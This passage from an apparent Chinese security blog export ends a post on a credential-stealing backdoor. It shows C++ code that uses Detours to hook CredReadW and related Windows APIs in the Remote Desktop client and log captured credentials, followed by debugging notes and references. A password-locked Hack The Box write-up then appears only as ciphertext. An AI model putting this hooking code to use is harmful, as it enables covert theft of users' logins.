MarshaledCredential) = CredIsMarshaledCredentialW;BOOL _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {    lpUsername = MarshaledCredential;    if (wcslen(lpUsername) &gt; 0) {        WriteCredentials();    }    return OriginalCredIsMarshaledCredentialW(MarshaledCredential);}BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved){    if (DetourIsHelperProcess()) {        return TRUE;    }    if (dwReason == DLL_PROCESS_ATTACH) {        DetourRestoreAfterWith();        DetourTransactionBegin();        DetourUpdateThread(GetCurrentThread());        DetourAttach(&amp;(PVOID&amp;)OriginalCryptProtectMemory, _CryptProtectMemory);        DetourAttach(&amp;(PVOID&amp;)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);        DetourAttach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);        DetourTransactionCommit();    }    else if (dwReason == DLL_PROCESS_DETACH) {        DetourTransactionBegin();        DetourUpdateThread(GetCurrentThread());        DetourDetach(&amp;(PVOID&amp;)OriginalCryptProtectMemory, _CryptProtectMemory);        DetourDetach(&amp;(PVOID&amp;)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);        DetourDetach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);        DetourTransactionCommit();    }    return TRUE;}</code></pre><p>测试可以正常记录IP<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk925v8pj30dd067q2u.jpg" alt="006LG7Nygy1g9xk925v8pj30dd067q2u.jpg"></p><p>这里一开始自己定义CredReadW的时候踩了个坑…return没有返回定义的函数。返回了API原型的函数，结果记录的IP一直是乱码。坑了好久，直到搜到了三好学生的博客- -<br>（一开始写的）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9xkcuvq7vj30la0daq3e.jpg" alt="006LG7Nygy1g9xkcuvq7vj30la0daq3e.jpg"></p><p>一定要返回定义的函数，不然问题多多….<br>这里应该返回CreadReadWs才对</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.4hou.com/technology/21645.html" target="_blank" rel="noopener">渗透技巧——从远程桌面客户端提取明文凭据 - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com</a><br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/wincred/nf-wincred-credreadw?view=vs-2017" target="_blank" rel="noopener">CredReadW function (wincred.h) - Win32 apps | Microsoft Docs</a></p>]]></content>
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack The Box - Traverxec</title>
      <link href="/posts/35f14d3d.html"/>
      <url>/posts/35f14d3d.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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